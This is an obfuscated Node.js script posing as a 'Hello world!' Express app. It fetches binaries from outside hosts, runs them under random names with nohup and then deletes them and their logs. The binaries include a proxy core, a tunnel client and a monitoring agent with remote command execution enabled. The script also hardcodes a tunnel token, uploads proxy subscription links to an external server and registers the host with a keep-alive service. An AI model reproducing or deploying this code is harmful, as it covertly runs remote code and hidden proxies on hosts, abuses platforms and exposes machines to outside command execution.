const _0x4af7=['Empowerment\x20failed\x20for\x20','Unhandled\x20error\x20in\x20startserver:','/config.json\x20>/dev/null\x202>&1\x20&','127.0.0.1','\x0a\x20\x20\x20\x20\x20\x20originRequest:\x0a\x20\x20\x20\x20\x20\x20\x20\x20noTLSVerify:\x20true\x0a\x20\x20\x20\x20-\x20service:\x20http_status:404\x0a\x20\x20','text/plain;\x20charset=utf-8','readdirSync','log','FILE_PATH','/vmess-argo','2087','data','\x0aclient_secret:\x20','split','ArgoDomain\x20not\x20found,\x20re-running\x20bot\x20to\x20obtain\x20ArgoDomain','base64','substring','all','ArgoDomain:','Error\x20executing\x20command:\x20','\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&','ARGO_DOMAIN:','\x0a\x0avmess://','xtls-rprx-vision','\x20successfully','?encryption=none&security=tls&sni=','get','unshift','.exe\x20>\x20nul\x202>&1','org','arm','/dev/null','NEZHA\x20variable\x20is\x20empty,skip\x20running','true','config.yaml','test','includes','false','ARGO_PORT','\x0a\x20\x20protocol:\x20http2\x0a\x20\x20\x0a\x20\x20ingress:\x0a\x20\x20\x20\x20-\x20hostname:\x20','Nodes\x20uploaded\x20successfully','443','country_code','Content-Type','rm\x20-rf\x20','pipe','push','tls','forEach','npm\x20running\x20error:\x20','taskkill\x20/f\x20/im\x20','has','existsSync','mkdirSync','PROJECT_URL','config.json','ARGO_DOMAIN','Download\x20','match','writeFileSync','application/json','CFIP','chmod','list.txt','isFile','UUID','utf-8','https://arm64.ssss.nyc.mn/bot','readFileSync','message','ARGO_AUTH','toString','/trojan-argo','pop','none','2083','http','aarch64','cdns.doon.eu.org','Error\x20reading\x20boot.log:','/vless-argo','close','clear','from','join','/api/delete-nodes','arm64','\x20>/dev/null\x202>&1\x20&','unlink','Hello\x20world!','catch','child_process','PORT','post','success','\x20failed:\x20','map','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20run\x20--token\x20','length','quic','http://ip-api.com/json/','boot.log','error','\x20>\x20nul\x202>&1','express','charAt','App\x20is\x20running','--tls','https://oooo.serv00.net/add-url','tunnel\x20--edge-ip-version\x20auto\x20--config\x20','Subscription\x20uploaded\x20successfully','unlinkSync','tunnel.yml','2096','NEZHA_SERVER','vless','/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:','countryCode','ARGO_AUTH\x20mismatch\x20TunnelSecret,use\x20token\x20connect\x20to\x20tunnel','\x0a\x0atrojan://','\x20-c\x20\x22','8443','/api/add-nodes','&fp=firefox&type=ws&host=','/vmess-argo?ed=2560','env','/tunnel.yml\x20run','util','SERVER_PORT','/api/add-subscriptions','Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!','https://arm64.ssss.nyc.mn/agent','set','del\x20/f\x20/q\x20','status','nohup\x20','stringify','\x0avless://','\x0a\x20\x20tunnel:\x20','\x20is\x20running'];const _0x58e2=function(_0x4af7b5,_0x58e2ae){_0x4af7b5=_0x4af7b5-0x0;let _0x260dfb=_0x4af7[_0x4af7b5];return _0x260dfb;};const express=require(_0x58e2('0x68'));const app=express();const axios=require('axios');const os=require('os');const fs=require('fs');const path=require('path');const {promisify}=require(_0x58e2('0x7f'));const exec=promisify(require(_0x58e2('0x5b'))['exec']);const {execSync}=require('child_process');const UPLOAD_URL=process['env']['UPLOAD_URL']||'';const PROJECT_URL=process['env'][_0x58e2('0x36')]||'';const AUTO_ACCESS=process[_0x58e2('0x7d')]['AUTO_ACCESS']||![];const FILE_PATH=process[_0x58e2('0x7d')][_0x58e2('0x8')]||'./tmp';const SUB_PATH=process[_0x58e2('0x7d')]['SUB_PATH']||'sub';const PORT=process['env'][_0x58e2('0x80')]||process[_0x58e2('0x7d')][_0x58e2('0x5c')]||0xbb8;const UUID=process['env'][_0x58e2('0x41')]||'7c771e04-3ac6-40b4-9ad7-7b66c65f583c';const NEZHA_SERVER=process['env'][_0x58e2('0x72')]||'';const NEZHA_PORT=process[_0x58e2('0x7d')]['NEZHA_PORT']||'';const NEZHA_KEY=process['env']['NEZHA_KEY']||'';const ARGO_DOMAIN=process['env'][_0x58e2('0x38')]||'9191.zhangcao.ggff.net';const ARGO_AUTH=process[_0x58e2('0x7d')][_0x58e2('0x46')]||'eyJhIjoiYTcxZjZhMDJjNzM2YTk2OWU4NzVlMTY1MmQxMzVhYWEiLCJ0IjoiOTllMmMyNDAtOTc4My00NjQ4LTg0NzYtNGJhZWVhYmYyNzE0IiwicyI6Ik9HSmhaV1V3T0RRdFpEa3dPQzAwWW1JeExXSTFNVEl0TWpRM09URXpPRGhsWVRjeCJ9';const ARGO_PORT=process[_0x58e2('0x7d')][_0x58e2('0x26')]||0x1f41;const CFIP=process['env'][_0x58e2('0x3d')]||_0x58e2('0x4e');const CFPORT=process[_0x58e2('0x7d')]['CFPORT']||0x1bb;const NAME=process[_0x58e2('0x7d')]['NAME']||'91张先生';if(!fs['existsSync'](FILE_PATH)){fs[_0x58e2('0x35')](FILE_PATH);console['log'](FILE_PATH+'\x20is\x20created');}else{console[_0x58e2('0x7')](FILE_PATH+'\x20already\x20exists');}function generateRandomName(){const _0x33b04a='abcdefghijklmnopqrstuvwxyz';let _0x3a6633='';for(let _0x7b7995=0x0;_0x7b7995<0x6;_0x7b7995++){_0x3a6633+=_0x33b04a['charAt'](Math['floor'](Math['random']()*_0x33b04a['length']));}return _0x3a6633;}const npmName=generateRandomName();const webName=generateRandomName();const botName=generateRandomName();const phpName=generateRandomName();let npmPath=path[_0x58e2('0x54')](FILE_PATH,npmName);let phpPath=path[_0x58e2('0x54')](FILE_PATH,phpName);let webPath=path[_0x58e2('0x54')](FILE_PATH,webName);let botPath=path[_0x58e2('0x54')](FILE_PATH,botName);let subPath=path[_0x58e2('0x54')](FILE_PATH,'sub.txt');let listPath=path[_0x58e2('0x54')](FILE_PATH,_0x58e2('0x3f'));let bootLogPath=path['join'](FILE_PATH,'boot.log');let configPath=path['join'](FILE_PATH,_0x58e2('0x37'));function deleteNodes(){try{if(!UPLOAD_URL)return;if(!fs[_0x58e2('0x34')](subPath))return;let _0x132bcb;try{_0x132bcb=fs['readFileSync'](subPath,_0x58e2('0x42'));}catch{return null;}const _0x10d3a7=Buffer['from'](_0x132bcb,_0x58e2('0xf'))['toString'](_0x58e2('0x42'));const _0x10d56e=_0x10d3a7['split']('\x0a')['filter'](_0xd1a340=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x58e2('0x23')](_0xd1a340));if(_0x10d56e[_0x58e2('0x62')]===0x0)return;axios['post'](UPLOAD_URL+_0x58e2('0x55'),JSON['stringify']({'nodes':_0x10d56e}),{'headers':{'Content-Type':'application/json'}})[_0x58e2('0x5a')](_0x5200fe=>{return null;});return null;}catch(_0x2e3a5d){return null;}}function cleanupOldFiles(){try{const _0x524926=fs[_0x58e2('0x6')](FILE_PATH);_0x524926[_0x58e2('0x30')](_0x1fe9ac=>{const _0x4722c8=path['join'](FILE_PATH,_0x1fe9ac);try{const _0x549c7c=fs['statSync'](_0x4722c8);if(_0x549c7c[_0x58e2('0x40')]()){fs[_0x58e2('0x6f')](_0x4722c8);}}catch(_0x11db9b){}});}catch(_0x33704d){}}app['get']('/',function(_0x1577a0,_0x52fa70){_0x52fa70['send'](_0x58e2('0x59'));});async function generateConfig(){const _0x25b391={'log':{'access':'/dev/null','error':_0x58e2('0x1f'),'loglevel':_0x58e2('0x4a')},'inbounds':[{'port':ARGO_PORT,'protocol':_0x58e2('0x73'),'settings':{'clients':[{'id':UUID,'flow':_0x58e2('0x17')}],'decryption':_0x58e2('0x4a'),'fallbacks':[{'dest':0xbb9},{'path':'/vless-argo','dest':0xbba},{'path':'/vmess-argo','dest':0xbbb},{'path':'/trojan-argo','dest':0xbbc}]},'streamSettings':{'network':'tcp'}},{'port':0xbb9,'listen':'127.0.0.1','protocol':_0x58e2('0x73'),'settings':{'clients':[{'id':UUID}],'decryption':_0x58e2('0x4a')},'streamSettings':{'network':'tcp','security':'none'}},{'port':0xbba,'listen':_0x58e2('0x3'),'protocol':_0x58e2('0x73'),'settings':{'clients':[{'id':UUID,'level':0x0}],'decryption':_0x58e2('0x4a')},'streamSettings':{'network':'ws','security':'none','wsSettings':{'path':_0x58e2('0x50')}},'sniffing':{'enabled':!![],'destOverride':[_0x58e2('0x4c'),'tls',_0x58e2('0x63')],'metadataOnly':![]}},{'port':0xbbb,'listen':'127.0.0.1','protocol':'vmess','settings':{'clients':[{'id':UUID,'alterId':0x0}]},'streamSettings':{'network':'ws','wsSettings':{'path':_0x58e2('0x9')}},'sniffing':{'enabled':!![],'destOverride':['http','tls',_0x58e2('0x63')],'metadataOnly':![]}},{'port':0xbbc,'listen':_0x58e2('0x3'),'protocol':'trojan','settings':{'clients':[{'password':UUID}]},'streamSettings':{'network':'ws','security':'none','wsSettings':{'path':_0x58e2('0x48')}},'sniffing':{'enabled':!![],'destOverride':[_0x58e2('0x4c'),_0x58e2('0x2f'),'quic'],'metadataOnly':![]}}],'dns':{'servers':['https+local://8.8.8.8/dns-query']},'outbounds':[{'protocol':'freedom','tag':'direct'},{'protocol':'blackhole','tag':'block'}]};fs[_0x58e2('0x3b')](path['join'](FILE_PATH,_0x58e2('0x37')),JSON[_0x58e2('0x88')](_0x25b391,null,0x2));}function getSystemArchitecture(){const _0x39a2ca=os['arch']();if(_0x39a2ca===_0x58e2('0x1e')||_0x39a2ca===_0x58e2('0x56')||_0x39a2ca===_0x58e2('0x4d')){return'arm';}else{return'amd';}}function downloadFile(_0x323452,_0x43a735,_0x224df0){const _0x2912e9=_0x323452;if(!fs[_0x58e2('0x34')](FILE_PATH)){fs[_0x58e2('0x35')](FILE_PATH,{'recursive':!![]});}const _0x12075a=fs['createWriteStream'](_0x2912e9);axios({'method':_0x58e2('0x1a'),'url':_0x43a735,'responseType':'stream'})['then'](_0x2a1793=>{_0x2a1793[_0x58e2('0xb')][_0x58e2('0x2d')](_0x12075a);_0x12075a['on']('finish',()=>{_0x12075a[_0x58e2('0x51')]();console[_0x58e2('0x7')](_0x58e2('0x39')+path['basename'](_0x2912e9)+_0x58e2('0x18'));_0x224df0(null,_0x2912e9);});_0x12075a['on']('error',_0x455b9a=>{fs[_0x58e2('0x58')](_0x2912e9,()=>{});const _0xde8b0f='Download\x20'+path['basename'](_0x2912e9)+'\x20failed:\x20'+_0x455b9a['message'];console['error'](_0xde8b0f);_0x224df0(_0xde8b0f);});})['catch'](_0x2788c7=>{const _0x5254b0='Download\x20'+path['basename'](_0x2912e9)+_0x58e2('0x5f')+_0x2788c7[_0x58e2('0x45')];console[_0x58e2('0x66')](_0x5254b0);_0x224df0(_0x5254b0);});}async function downloadFilesAndRun(){const _0xd36a3a=getSystemArchitecture();const _0x32e0de=getFilesForArchitecture(_0xd36a3a);if(_0x32e0de['length']===0x0){console['log']('Can\x27t\x20find\x20a\x20file\x20for\x20the\x20current\x20architecture');return;}const _0xec8737=_0x32e0de[_0x58e2('0x60')](_0x3d80d5=>{return new Promise((_0x4d89f4,_0x4f76ad)=>{downloadFile(_0x3d80d5['fileName'],_0x3d80d5['fileUrl'],(_0xa5a12a,_0x13b1d2)=>{if(_0xa5a12a){_0x4f76ad(_0xa5a12a);}else{_0x4d89f4(_0x13b1d2);}});});});try{await Promise[_0x58e2('0x11')](_0xec8737);}catch(_0x267beb){console['error']('Error\x20downloading\x20files:',_0x267beb);return;}function _0x307772(_0x5b927a){const _0x32d05f=0x1fd;_0x5b927a[_0x58e2('0x30')](_0x5032e1=>{if(fs['existsSync'](_0x5032e1)){fs[_0x58e2('0x3e')](_0x5032e1,_0x32d05f,_0x2373d6=>{if(_0x2373d6){console['error'](_0x58e2('0x0')+_0x5032e1+':\x20'+_0x2373d6);}else{console[_0x58e2('0x7')]('Empowerment\x20success\x20for\x20'+_0x5032e1+':\x20'+_0x32d05f[_0x58e2('0x47')](0x8));}});}});}const _0x3d8c3d=NEZHA_PORT?[npmPath,webPath,botPath]:[phpPath,webPath,botPath];_0x307772(_0x3d8c3d);if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x35802b=NEZHA_SERVER['includes'](':')?NEZHA_SERVER[_0x58e2('0xd')](':')[_0x58e2('0x49')]():'';const _0x4b929a=new Set(['443',_0x58e2('0x79'),'2096',_0x58e2('0xa'),'2083','2053']);const _0x5027f0=_0x4b929a[_0x58e2('0x33')](_0x35802b)?_0x58e2('0x21'):_0x58e2('0x25');const _0x3c946a=_0x58e2('0xc')+NEZHA_KEY+'\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20'+NEZHA_SERVER+'\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20'+_0x5027f0+'\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20'+UUID;fs[_0x58e2('0x3b')](path[_0x58e2('0x54')](FILE_PATH,_0x58e2('0x22')),_0x3c946a);const _0x5829dc=_0x58e2('0x87')+phpPath+_0x58e2('0x78')+FILE_PATH+'/config.yaml\x22\x20>/dev/null\x202>&1\x20&';try{await exec(_0x5829dc);console[_0x58e2('0x7')](phpName+'\x20is\x20running');await new Promise(_0x402644=>setTimeout(_0x402644,0x3e8));}catch(_0x487c12){console[_0x58e2('0x66')]('php\x20running\x20error:\x20'+_0x487c12);}}else{let _0xaf200f='';const _0x262ea7=[_0x58e2('0x29'),'8443',_0x58e2('0x71'),'2087',_0x58e2('0x4b'),'2053'];if(_0x262ea7[_0x58e2('0x24')](NEZHA_PORT)){_0xaf200f=_0x58e2('0x6b');}const _0x39ed62=_0x58e2('0x87')+npmPath+'\x20-s\x20'+NEZHA_SERVER+':'+NEZHA_PORT+'\x20-p\x20'+NEZHA_KEY+'\x20'+_0xaf200f+_0x58e2('0x14');try{await exec(_0x39ed62);console[_0x58e2('0x7')](npmName+'\x20is\x20running');await new Promise(_0x545d41=>setTimeout(_0x545d41,0x3e8));}catch(_0x161987){console['error'](_0x58e2('0x31')+_0x161987);}}}else{console['log'](_0x58e2('0x20'));}const _0x368af1=_0x58e2('0x87')+webPath+'\x20-c\x20'+FILE_PATH+_0x58e2('0x2');try{await exec(_0x368af1);console[_0x58e2('0x7')](webName+'\x20is\x20running');await new Promise(_0x2b8fff=>setTimeout(_0x2b8fff,0x3e8));}catch(_0x265765){console['error']('web\x20running\x20error:\x20'+_0x265765);}if(fs[_0x58e2('0x34')](botPath)){let _0x2056c1;if(ARGO_AUTH[_0x58e2('0x3a')](/^[A-Z0-9a-z=]{120,250}$/)){_0x2056c1=_0x58e2('0x61')+ARGO_AUTH;}else if(ARGO_AUTH[_0x58e2('0x3a')](/TunnelSecret/)){_0x2056c1=_0x58e2('0x6d')+FILE_PATH+_0x58e2('0x7e');}else{_0x2056c1='tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20'+FILE_PATH+'/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:'+ARGO_PORT;}try{await exec(_0x58e2('0x87')+botPath+'\x20'+_0x2056c1+'\x20>/dev/null\x202>&1\x20&');console[_0x58e2('0x7')](botName+_0x58e2('0x8b'));await new Promise(_0x588665=>setTimeout(_0x588665,0x7d0));}catch(_0x296664){console[_0x58e2('0x66')](_0x58e2('0x13')+_0x296664);}}await new Promise(_0x5d868f=>setTimeout(_0x5d868f,0x1388));}function getFilesForArchitecture(_0x296ede){let _0x5e27c8;if(_0x296ede==='arm'){_0x5e27c8=[{'fileName':webPath,'fileUrl':'https://arm64.ssss.nyc.mn/web'},{'fileName':botPath,'fileUrl':_0x58e2('0x43')}];}else{_0x5e27c8=[{'fileName':webPath,'fileUrl':'https://amd64.ssss.nyc.mn/web'},{'fileName':botPath,'fileUrl':'https://amd64.ssss.nyc.mn/bot'}];}if(NEZHA_SERVER&&NEZHA_KEY){if(NEZHA_PORT){const _0x39c45a=_0x296ede===_0x58e2('0x1e')?_0x58e2('0x83'):'https://amd64.ssss.nyc.mn/agent';_0x5e27c8[_0x58e2('0x1b')]({'fileName':npmPath,'fileUrl':_0x39c45a});}else{const _0x17ea42=_0x296ede===_0x58e2('0x1e')?'https://arm64.ssss.nyc.mn/v1':'https://amd64.ssss.nyc.mn/v1';_0x5e27c8[_0x58e2('0x1b')]({'fileName':phpPath,'fileUrl':_0x17ea42});}}return _0x5e27c8;}function argoType(){if(!ARGO_AUTH||!ARGO_DOMAIN){console[_0x58e2('0x7')]('ARGO_DOMAIN\x20or\x20ARGO_AUTH\x20variable\x20is\x20empty,\x20use\x20quick\x20tunnels');return;}if(ARGO_AUTH['includes']('TunnelSecret')){fs[_0x58e2('0x3b')](path['join'](FILE_PATH,'tunnel.json'),ARGO_AUTH);const _0x1a2002=_0x58e2('0x8a')+ARGO_AUTH[_0x58e2('0xd')]('\x22')[0xb]+'\x0a\x20\x20credentials-file:\x20'+path['join'](FILE_PATH,'tunnel.json')+_0x58e2('0x27')+ARGO_DOMAIN+'\x0a\x20\x20\x20\x20\x20\x20service:\x20http://localhost:'+ARGO_PORT+_0x58e2('0x4');fs[_0x58e2('0x3b')](path['join'](FILE_PATH,_0x58e2('0x70')),_0x1a2002);}else{console['log'](_0x58e2('0x76'));}}async function extractDomains(){let _0x1beba7;if(ARGO_AUTH&&ARGO_DOMAIN){_0x1beba7=ARGO_DOMAIN;console[_0x58e2('0x7')](_0x58e2('0x15'),_0x1beba7);await _0x362821(_0x1beba7);}else{try{const _0x40d98e=fs['readFileSync'](path['join'](FILE_PATH,_0x58e2('0x65')),'utf-8');const _0x44d3ea=_0x40d98e['split']('\x0a');const _0x5aaa9b=[];_0x44d3ea['forEach'](_0x78f6de=>{const _0x401a5e=_0x78f6de['match'](/https?:\/\/([^ ]*trycloudflare\.com)\/?/);if(_0x401a5e){const _0x4797a4=_0x401a5e[0x1];_0x5aaa9b['push'](_0x4797a4);}});if(_0x5aaa9b['length']>0x0){_0x1beba7=_0x5aaa9b[0x0];console[_0x58e2('0x7')](_0x58e2('0x12'),_0x1beba7);await _0x362821(_0x1beba7);}else{console['log'](_0x58e2('0xe'));fs['unlinkSync'](path['join'](FILE_PATH,'boot.log'));async function _0x3cc8b0(){try{if(process['platform']==='win32'){await exec(_0x58e2('0x32')+botName+_0x58e2('0x1c'));}else{await exec('pkill\x20-f\x20\x22['+botName[_0x58e2('0x69')](0x0)+']'+botName[_0x58e2('0x10')](0x1)+'\x22\x20>\x20/dev/null\x202>&1');}}catch(_0x4c58e1){}}_0x3cc8b0();await new Promise(_0x3bd82f=>setTimeout(_0x3bd82f,0xbb8));const _0x35ed72='tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20'+FILE_PATH+_0x58e2('0x74')+ARGO_PORT;try{await exec('nohup\x20'+botPath+'\x20'+_0x35ed72+_0x58e2('0x57'));console[_0x58e2('0x7')](botName+'\x20is\x20running');await new Promise(_0x1bf14c=>setTimeout(_0x1bf14c,0xbb8));await extractDomains();}catch(_0x1ef875){console['error'](_0x58e2('0x13')+_0x1ef875);}}}catch(_0x177d2e){console[_0x58e2('0x66')](_0x58e2('0x4f'),_0x177d2e);}}async function _0x4a5aa5(){try{const _0x408fb1=await axios[_0x58e2('0x1a')]('https://ipapi.co/json/',{'timeout':0xbb8});if(_0x408fb1['data']&&_0x408fb1[_0x58e2('0xb')]['country_code']&&_0x408fb1[_0x58e2('0xb')][_0x58e2('0x1d')]){return _0x408fb1['data'][_0x58e2('0x2a')]+'_'+_0x408fb1[_0x58e2('0xb')][_0x58e2('0x1d')];}}catch(_0x102f99){try{const _0x334984=await axios[_0x58e2('0x1a')](_0x58e2('0x64'),{'timeout':0xbb8});if(_0x334984['data']&&_0x334984['data']['status']===_0x58e2('0x5e')&&_0x334984['data']['countryCode']&&_0x334984['data'][_0x58e2('0x1d')]){return _0x334984['data'][_0x58e2('0x75')]+'_'+_0x334984[_0x58e2('0xb')]['org'];}}catch(_0x1cd9cf){}}return'Unknown';}async function _0x362821(_0x3aba6e){const _0x4f1e6b=await _0x4a5aa5();const _0x1b2e01=NAME?NAME+'-'+_0x4f1e6b:_0x4f1e6b;return new Promise(_0x490bca=>{setTimeout(()=>{const _0x4d1fee={'v':'2','ps':''+_0x1b2e01,'add':CFIP,'port':CFPORT,'id':UUID,'aid':'0','scy':'none','net':'ws','type':'none','host':_0x3aba6e,'path':_0x58e2('0x7c'),'tls':'tls','sni':_0x3aba6e,'alpn':'','fp':'firefox'};const _0x168a8a=_0x58e2('0x89')+UUID+'@'+CFIP+':'+CFPORT+_0x58e2('0x19')+_0x3aba6e+'&fp=firefox&type=ws&host='+_0x3aba6e+'&path=%2Fvless-argo%3Fed%3D2560#'+_0x1b2e01+_0x58e2('0x16')+Buffer['from'](JSON['stringify'](_0x4d1fee))[_0x58e2('0x47')](_0x58e2('0xf'))+_0x58e2('0x77')+UUID+'@'+CFIP+':'+CFPORT+'?security=tls&sni='+_0x3aba6e+_0x58e2('0x7b')+_0x3aba6e+'&path=%2Ftrojan-argo%3Fed%3D2560#'+_0x1b2e01+'\x0a\x20\x20\x20\x20';console['log'](Buffer[_0x58e2('0x53')](_0x168a8a)[_0x58e2('0x47')]('base64'));fs['writeFileSync'](subPath,Buffer['from'](_0x168a8a)[_0x58e2('0x47')]('base64'));console[_0x58e2('0x7')](FILE_PATH+'/sub.txt\x20saved\x20successfully');uploadNodes();app[_0x58e2('0x1a')]('/'+SUB_PATH,(_0x412a11,_0x23c00f)=>{const _0x3c297d=Buffer[_0x58e2('0x53')](_0x168a8a)[_0x58e2('0x47')]('base64');_0x23c00f[_0x58e2('0x84')](_0x58e2('0x2b'),_0x58e2('0x5'));_0x23c00f['send'](_0x3c297d);});_0x490bca(_0x168a8a);},0x7d0);});}}async function uploadNodes(){if(UPLOAD_URL&&PROJECT_URL){const _0x13b044=PROJECT_URL+'/'+SUB_PATH;const _0x355602={'subscription':[_0x13b044]};try{const _0x67c2f3=await axios[_0x58e2('0x5d')](UPLOAD_URL+_0x58e2('0x81'),_0x355602,{'headers':{'Content-Type':'application/json'}});if(_0x67c2f3&&_0x67c2f3['status']===0xc8){console['log'](_0x58e2('0x6e'));return _0x67c2f3;}else{return null;}}catch(_0x2189ad){if(_0x2189ad['response']){if(_0x2189ad['response']['status']===0x190){}}}}else if(UPLOAD_URL){if(!fs['existsSync'](listPath))return;const _0x333a5b=fs[_0x58e2('0x44')](listPath,_0x58e2('0x42'));const _0x101f8c=_0x333a5b[_0x58e2('0xd')]('\x0a')['filter'](_0x514903=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x58e2('0x23')](_0x514903));if(_0x101f8c['length']===0x0)return;const _0x441044=JSON['stringify']({'nodes':_0x101f8c});try{const _0x168311=await axios['post'](UPLOAD_URL+_0x58e2('0x7a'),_0x441044,{'headers':{'Content-Type':_0x58e2('0x3c')}});if(_0x168311&&_0x168311[_0x58e2('0x86')]===0xc8){console[_0x58e2('0x7')](_0x58e2('0x28'));return _0x168311;}else{return null;}}catch(_0x1626bb){return null;}}else{return;}}function cleanFiles(){setTimeout(()=>{const _0xa2288b=[bootLogPath,configPath,webPath,botPath];if(NEZHA_PORT){_0xa2288b[_0x58e2('0x2e')](npmPath);}else if(NEZHA_SERVER&&NEZHA_KEY){_0xa2288b['push'](phpPath);}if(process['platform']==='win32'){exec(_0x58e2('0x85')+_0xa2288b[_0x58e2('0x54')]('\x20')+_0x58e2('0x67'),_0x36e8d5=>{console[_0x58e2('0x52')]();console['log'](_0x58e2('0x6a'));console[_0x58e2('0x7')](_0x58e2('0x82'));});}else{exec(_0x58e2('0x2c')+_0xa2288b['join']('\x20')+'\x20>/dev/null\x202>&1',_0x5109a1=>{console['clear']();console['log'](_0x58e2('0x6a'));console[_0x58e2('0x7')](_0x58e2('0x82'));});}},0x15f90);}cleanFiles();async function AddVisitTask(){if(!AUTO_ACCESS||!PROJECT_URL){console['log']('Skipping\x20adding\x20automatic\x20access\x20task');return;}try{const _0x3b8a67=await axios[_0x58e2('0x5d')](_0x58e2('0x6c'),{'url':PROJECT_URL},{'headers':{'Content-Type':_0x58e2('0x3c')}});console[_0x58e2('0x7')]('automatic\x20access\x20task\x20added\x20successfully');return _0x3b8a67;}catch(_0xf72f16){console[_0x58e2('0x66')]('Add\x20automatic\x20access\x20task\x20faild:\x20'+_0xf72f16[_0x58e2('0x45')]);return null;}}async function startserver(){try{argoType();deleteNodes();cleanupOldFiles();await generateConfig();await downloadFilesAndRun();await extractDomains();await AddVisitTask();}catch(_0x15e029){console['error']('Error\x20in\x20startserver:',_0x15e029);}}startserver()['catch'](_0xbc886c=>{console['error'](_0x58e2('0x1'),_0xbc886c);});app['listen'](PORT,()=>console['log']('http\x20server\x20is\x20running\x20on\x20port:'+PORT+'!'));
